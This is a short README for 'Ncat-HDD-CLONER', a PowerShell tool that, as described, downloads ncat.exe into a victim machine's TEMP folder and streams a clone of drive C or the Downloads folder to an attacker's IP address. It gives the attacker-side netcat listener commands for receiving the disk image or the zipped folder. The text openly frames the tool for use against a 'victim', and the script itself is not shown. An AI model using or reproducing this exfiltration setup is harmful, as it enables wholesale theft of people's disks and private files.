# Ncat-HDD-CLONER
This script is coded in powershell, How it works, it will go no and download ncat.exe file in the 
/TEMP location of your victim machine and after it will go on and clone the local disk C or Downloads depending
to the script you use and it sends it to the attacks's ip address.
```text
change the port and ip address in the script to attack's ip and port
```
Usage:

Linux machine Receiver with **C:cloner.ps1**
```
nc -l -p 12345 | pv | dd of=/path/to/target/image.img bs=4M
```

Linux machine Receiver with **Downloads:cloner.ps1**
```
nc -l -p 12345 > Downloads.zip && unzip Downloads.zip -d /path/to/extract/
```
This command receivers the zipped data sent by ncat and unzip it to the provided location
